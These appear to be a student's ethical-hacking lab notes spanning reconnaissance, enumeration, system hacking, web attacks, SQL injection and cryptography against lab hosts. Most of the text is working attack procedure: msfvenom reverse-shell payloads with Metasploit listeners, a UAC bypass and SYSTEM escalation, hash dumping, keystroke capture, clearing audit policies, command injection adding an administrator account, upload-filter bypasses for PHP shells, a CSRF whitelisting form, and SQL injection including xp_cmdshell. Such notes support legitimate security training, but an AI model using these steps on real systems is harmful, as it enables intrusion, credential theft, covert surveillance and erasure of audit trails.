Module 1 - Footprinting and Reconnaissance 

Ping 10.10.10.16

Ping www.moviescope.com -f -l 1500
//packet needs to be fragmented but DF set.


Ping www.moviescope.com -f -l 1300
//-l means to the buffer size


Ping www.moviescope.com -f -l 1473
//packet needs to be fragmented but DF set.

Ping www.moviescope.com -f -l 1472
//The command replies with a successful ping.
//The maximum frame size will differ depending upon the target network

tracert www.moviescope.com
//used for counting the hops between system and target

Collecting website information using firebug tool
//firebug browser extension - is just like browser developer tools
//find the server version and language/framework used for the website


Analyse all directories of a website: using HTTrack web site copier tool (website mirroring - win tool)

Advanced network route tracing using Path Analyser Pro(win tool):
//Just like tracers, - shows IPs of all hops

Information gathering using metasploit:

Service postgresql start
Msfconsole
db_status (if no connection, exit msf)
Msfdb init
Service postgresql restart
Msfconsole
db_status(connected)

nmap -Pn -sS -A -oX Test 10.10.10.0/24
//showing the total number of active hosts in the subnet

db_import Test
hosts
db_nmap -sS -A 10.10.10.16 
//scanning a host probably a windows server machines and fetching service information

services
//to get all active machines service information

use scanner/smb/smb_version
set RHOSTS 10.10.10.8-16 
set THREADS 100
run
//os information collected 

hosts
//to display collected all os_flavor information at once



Module 2 - Enumeration

Global network inventory tool
//Provide an IP range, if you have the credentials, fill in the connect as form. Walkthrough all tab and hover on each row to see details.

Advanced IP scanner
//Identify the devices on your network that are open to known vulnerabilities
//enumerating user accounts, groups, shared folders, softwares installed. In short, enumeration!

Super scan
//NETBIOS information, also like advanced IP scanner capabilities, TCP and UDP open ports
//Identify policies and passwords

Hyena
//like all above, additional - application and banners


NETBIOS enumerator
//target user names, MAC address and domain group
//account lockout threshold
//local groups and user accounts
//global groups and user accounts 


SoftPerfect network scanner
//hardware MAC address across routers
//hidden shared folders and writable ones
//Internal and external IP address


Nmap
//usernames and user groups
//Lists of computers, their OS and the ports on them
// machine names, network resources and services
//lists of shares on the individual lists on the network
//policies and passwords


nbtstat- A host_ip
//on Windows system on same network range
//to find out the netbios remote machines name table

net use
//to view the created null sessions/shared folders from your host


net use \\<host_ip>\e “”\user:””
net use \\<host_ip>\e “”/user:””
//creates null session
//here “e” is all session name
//Go to your file explorer and see a new drive (probably z:\)
//issue “net use” command to see a newly created/connects of null sessions


nmap -sP 10.10.10.0/24 
//initiates the ping sweep scan 
//scans all nodes on the given network range and starts displaying all the hosts that are up and running. Along with their respective MAC addresses and device information.
//Now you can choose an active machine IP from result and perform stealthy scan using -sS
// SYN scan with version and OS detection using -sSV -O 
//-oN enumerationOutput.txt saves the output in home directory 


SNMP enumeration using snmp_enum
//enumerate users’ accounts and devices on a SNMP enabled computer.
//comes with 2 passwords - to configure and one to access the SNMP agent from the management station.

Nmap -sU -p 161 <ip>
nmap -sU -p 161 —script=snmp-brute <ip>
//output will be public - valid credentials, now lets make use of metas-loot framework

Msfconsole
Use auxiliary/scanner/snmp/snmp_login
Set RHOSTS <ip>

Use auxiliary/scanner/snmp/snmp_enum
Set RHOSTS <ip>


LDAP enumeration using active directory explorer (ADExplorer)
//provide the IP and start scanning
//it will list the active directory structure which contains user list
//modify any one user name from the list


Enum4linux -u Martin -p apple -U 10.10.10.12
Enum4linux -u Martin -p apple -o 10.10.10.12
//OS details
Enum4linux -u Martin -p apple -P 10.10.10.12
//password policy information
Enum4linux -u Martin -p apple -G 10.10.10.12
//groups information
Enum4linux -u Martin -p apple -S 10.10.10.12
//share policy information



Module 3 - Vulnerability Analysis

In this model, we scan the host to identify any known vulnerabilities from running services on the host. Scanning for services in open ports, banner grabbing etc.

Using Nesus and Nikto


Module 4 - System hacking

The goal of system hacking is to gain access, escalate privileges, execute applications, and. Hide files

extracting admin passwords
Hiding and recovering hidden files
Recovering passwords
Monitoring a system remotely

Dumping and cracking SAM hashes to extract plaintext passwords

use pwdump7 tool to extract password hashes
Use Ophcrack tool to crack the passwords and obtain plaintext

//Open cmd with admin privileges
 wmic 	useraccount get name,sid 
//This command displays user account names and their respective IDs

pwdump7.exe 
//just have to run this command in the given tool folder, it will extract the password hashes of all users

pwdump7.exe > C:\hashes.txt 
//this will save the password hashes in a file for later use.


//Open and run the ophcrack tool and load the pwddummp file from above command saved file
//for tables, select vista free and install


Creating and using a rainbow tables
//make use of winrtgen tool
//set min len 4, max len 6, counts 4000000, select loweralpha from charset list and start generating the hashes by clicking on OK. It takes approximately 1 hour to generate and store it in the same directory.
//Now the generate file is used by other cracking tool like RainbowCrack


Auditing the system passwords using L0phtCrack
//Audit password wizard, provide all details like host, specific username and password etc. for remote system, and select appropriate options
//It will take a lot of time to crack the password


Exploiting client side vulnerabilities and establishing a VNC session
//on kali machine
Msfvenom -p windows/meterpreter/reverse_tcp —platform windows -a x86 -f exe LHOST=10.10.10.11 LPORT=444 -o /root/Desktop/Test.exe 

//move the Test.exe to /var/www/html/share directory which has 755 permission and www-data owner

Service apache2 start
//start apache server

msfconsole
Use multi/handler
Set payload windows/meterpreter/reverse_tcp
Set LHOST 10.10.10.11
Set LPORT 444
Run


Now switch to victim’s machine/windows
Open http://10.10.10.11/share and click on Test.exe and save the file


//Now switch back to kali and see a new session will be opened with meterpreter level
sysinfo
run vnc  


Escalate the privileges by exploiting client side vulnerabilities
//on kali machine
msfvenom -p windows/meterpreter/reverse_tcp —platform windows -a x86/shikata_ga_nai -b “\x00” -f exe LHOST=10.10.10.11 > Desktop/Exploit.exe

//move the Exploit.exe to /var/www/html/share directory which has 755 permission and www-data owner

msfconsole
Use multi/handler
Set payload windows/meterpreter/reverse_tcp
Set LHOST 10.10.10.11
exploit -j -z


Now switch to victim’s machine/windows
Open http://10.10.10.11/share and click on Exploit.exe and run the file

Now go back to kali - attacking machine and observe a new session is opened in the background
Sessions -I 1 
//it will open the shell in interactive mode again from the background

meterpreter>getuid
meterpreter>Run post/windows/gather/smart_hashdump
meterpreter> getsystem -t 1
//which uses the service - names pipe impersonation (in memory/admin) technique
//but this technique fails

meterpreter>background
//background the session

use exploit/windows/local/bypassuac_fodhelper 
show options
set SESSION 1
set payload windows/meterpreter/reverse_tcp
show options
set LHOST 10.10.10.11
set TARGET 0
exploit
//Now it begins to exploit the UAC settings in windows 10 machine

meterpreter>getuid
//still running the normal user

meterpreter>getsystem
//elevates the privileges 
meterpreter>getuid
//now running AUTHORITY\SYSTEM user

meterpreter>run post/windows/gather/smart_hashdump
//gets admin user’s NTLM hash
Hacking windows 10 using metasploit, and post-exploitation using meterpreter

msfvenom -p windows/meterpreter/reverse_tcp —platform windows -a x86-e x86/shikata_ga_nai -b “\x00” -f exe LHOST=10.10.10.11 > Desktop/Backdoor.exe

Service apache2 start

//move the backdoor.exe to /var/www/html/share directory which has 755 permission and www-data owner

msfconsole
Use exploit/multi/handler
Set payload windows/meterpreter/reverse_tcp
Set LHOST 10.10.10.11
exploit -j -z


Now switch to victim’s machine/windows
Open http://10.10.10.11/share and click on Backdoor.exe and run the file

Now go back to kali - attacking machine and observe a new session is opened in the background
Sessions -I 1 
//it will open the shell in interactive mode again from the background
meterpreter>sysinfo
meterpreter>ipconfig

Timestomp secret.txt -v
//To view the MACE attribute of secret.txt. Created, accessed, modified and entry modified time

download bootmgr
//will be downloaded to kali/attacking machine

search -f pageful.sys
//just like find command from kali

keyscan_start 
//this will start capturing the keyboard input from victim machine

keyscan_dump
//dumps all keystrokes

ideltime
//this will display the number of seconds the user has been idle on the remote system

shutdown
//will shutdown the victim machine


User system monitoring and surveillance using spytech and spyagent 
//Install and setup the spytech tool

Web activity monitoring and recording using power spy

Hiding files using NTFS streams
//this method works only on NTFS format drive
//For example let’s copy calc.exe file from system32/ and paste in C:\Magic folder
//Open CMD and cd to c:\magic
Notepad readme.txt 
//add hello world in the file
//now dir to check the size of readme.txt for example 13 bytes
type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe
//now also the size of readme.txt file is same 13 bytes

mklink backdorr.exe readme.txt:calc.exe 
//creates symbolic links for readme.txt:calc.exe file in the name of backdoor.exe

Backdoor.exe
//it will open the calc.exe file, that is calculator

 
Hiding data using white space steganographic
//Create a file - readme.txt and store it in snow tool folder under white-space steganography directory

C:\….\snow>snow -C -m “some secret message” -p “random password” readme.txt readme2.txt 

//now the secret message is stored is hidden inside readme2.txt file with the content of readme.txt

//the content includes “secret message” + readme.txt file

snow -C -p “random password” readme2.txt 
//this will show you the content of actual readme.txt, that is secret message


Image stenography using OpenStego
//easy to use openstego tool
//put a secret message file and a cover file to hide it

Image stenography using Quick Stego
//it’s easy to use quick stego tool


Viewing, enabling and clearing audit policies using auditpol
cmd> auditpol /get /category:*
//to view all audit policies


cmd> auditpol /set /category:”system”,”account logon” /success:enable /failure:enable
//to enable the audit policies


cmd> auditpol /get /category:*
//tocheck whether audit policies are enabled or not

cmd> auditpol /clear /y
//to clear audit policies

cmd> auditpol /get /category:*
//tocheck whether audit policies are cleared or not


Convert channels using Convert_TCP
//helps you to hide/add a data in TCP/IP header unused fields.

Terminal> cd Desktop; mkdir send; cd send; echo “secret message” > message.txt

//Now connect to windows machine using smb//<ip> from other connections in file manager in kali machine
//copy the covert_tcp.c to send directory
terminal>cc -o covert_tcp covert_tcp.c 

//ubuntu machine
terminal> cd desktop; mkdir receive; cd receive

//Now connect to windows machine using smb//<ip> from other connections in file manager in ubuntu machine

terminal>cc -o covert_tcp covert_tcp.c

//to start a listener
terminal> ./covert_tcp -dest 10.10.10.9 -source 10.10.10.11 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/receive/receive..txt

//back to kali machine and open Wireshark in eth0 interface

terminal> ./covert_tcp -dest 10.10.10.9 -source 10.10.10.11 -source_port 8888 -dest_port 9999 -file /root/Desktop/send/message.txt
//it will start sending the file using covert_tcp


Hacking Windows Server 2012 with a malicious office Document using TheFatRat
TheFatRat is used to create a payload in doc format which helps in getting a reverse shell easily. Later make use of meterpreter multi/handler and windows reverse_tcp payload to start listening.

Active Online Attack using Responder
//perform LLMNR/NBT-NS spoofing attack on a network

terminal> responder -I eth0

//Switch victim machine and execute \\ceh-tools in RUN command/window

//switch to attacking machine/kali and go to /usr/share/responder/logs folder to check the collected access hashes

//now crack with John

terminal> John /usr/share/responder/logs/<file name>

| dir C:\
| net user
| tasklist
| whoami  
| net user Test /Add  = here new user added
| net user
| net local group Administrators Test /Add = to add the user to admin group
| net user Test

Now can login to the web sever using above created user without password with the help of RDP


//Auditing web application framework using Vega


//File  upload vulnerability(level low) - PHP
Note - https://www.revshells.com/

msfvenom -p php/meterpreter/reverse_tcp lhost=my_sys_ip lport=listening_port -f raw 

//Upload the file and also if the response shows path where it saved, note the path

msfconsole
use multi/handler
set payload php/meterpreter/reverse_tcp
set lhost your_sys_ip
set lport listening_port
Run

//browse the uploaded file and session will be opened in the metasploit



//File  upload vulnerability(level medium) - JPEG or JPG

Append the file type extension to previously generated php reverse shell payload
Eg - upload.php to upload.php.jpg
//also need burp to change the upload payload file type eg. upload.php.jpg to upload.php again and forward the request

msfconsole
use multi/handler
set payload php/meterpreter/reverse_tcp
set lhost your_sys_ip
set lport listening_port
Run

//File  upload vulnerability(level high)
Now open the upload.php in any editor and append GIF98 in the beginning and save
Now rename it from upload.php to upload.jpg and upload it

Now go to command injection in DVWA
|copy C:\wamp64\www\DVWA\hackable\uploads\upload.jpg C:\wamp64\www\DVWA\hackable\uploads\shell.php 

//the response should be 1 file copied

msfconsole
use multi/handler
set payload php/meterpreter/reverse_tcp
set lhost your_sys_ip
set lport listening_port
Run

Now browse the newly copied file to get the session 


//CSRF on Wordpress(plugin WP-firewall)

Enumerate using wpscan
wpscan -u  http://wordpress_ip:8080/CEH —enumerate vp

This will display the vulnerable plugin firewall 2 
Note down the full path where it is installed

Now generate a payload eg. Like below

<form method=“POST” action=“http://10.10.10.12:8080/CEH/wp-admin/options-general.php?page=wordpress-firewall-2%Fwordpress-firewall-2.php”>
<script>alert(“As an admin, to enable additional security to your website. Click submit”)</script>
<input type=“hidden” name=“whitelist_ip[]” value=“10.10.10.11”>
<input type=“hidden” name=“set_whitelist_ip” value=“Set whitelisted IPs” class=“button-secondary”>
<input type=“submit”>
</form> 

Module 9 - SQL Injection
//The login can be bypassed using basic sql conditional based payload(username). FYI - leave the password empty
//on the same end-point, you can insert a new record eg. Blah’;insert into login values(‘John’,’Password123’);—

//on the same end-point, you can create a database eg. Blah’; create database my database;—

//on the same end-point, you can perform a DOS attack eg. Blah’;exec master..xo_cmdshell ‘ping www.moviescope.com(same target url/ip) -l 65000 -t’;—


Scanning web applications using N-Stalker tool

Performing SQL injection attack against MSSQL to extract databases and web shell using SQLMAP
//extract the logged user cookie using developer console - document.cookie

sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” —cookie=“Add the cookie value here” —dbs

sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” —cookie=“Add the cookie value here” -D moviescope —tables

Module 9 - Cryptography

//Use HashCalc to monitor your file integrity
//Use MD5 calculator to check your file integrity
//use Crypto Forge tool to encrypt the decrypt the file. It support cfd 
//encrypting and decrypting the data using BCTextEncoder

//creating and using self-signed certificate

Eg. Say a site is note reachable because a explicit request is made using https 

Start > Windows administrative tools > Internet Information Services(IIS) Manager > then select the machine from left hand side from connection section

Select server certificates from IIS section and click create self-signed certificate(on the right hand side Action items)

Now give any name for the certificate and choose personal

Now choose the site, to bind from site folder(left hand side) and provide all details(https, IP, hostname, select the certificate) on the wizard

Now refresh the site from site section and load the site on the browser on https
